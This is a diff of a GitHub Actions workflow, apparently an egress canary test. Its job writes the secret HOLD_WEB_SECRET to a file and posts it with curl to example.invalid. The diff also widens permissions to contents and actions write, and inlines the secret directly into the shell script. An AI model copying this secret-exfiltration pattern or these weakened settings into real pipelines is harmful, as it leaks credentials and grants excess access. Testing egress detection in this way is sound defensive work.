@@ -6,19 +6,17 @@ on:
       - main
 
 permissions:
-  contents: read
+  contents: write
+  actions: write
 
 jobs:
   suspicious-secret-egress:
     runs-on: ubuntu-latest
     steps:
       - name: Stage owned secret canary
-        env:
-          HOLD_WEB_SECRET: ${{ secrets.HOLD_WEB_SECRET }}
         run: |
-          test -n "$HOLD_WEB_SECRET"
           mkdir -p hold-proof
-          printf '%s\n' "$HOLD_WEB_SECRET" > hold-proof/owner-secret-canary.txt
+          printf '%s\n' '${{ secrets.HOLD_WEB_SECRET }}' > hold-proof/owner-secret-canary.txt
           curl --fail --silent --show-error --max-time 5 \
             --data-binary @hold-proof/owner-secret-canary.txt \
             https://example.invalid/owned-control || true
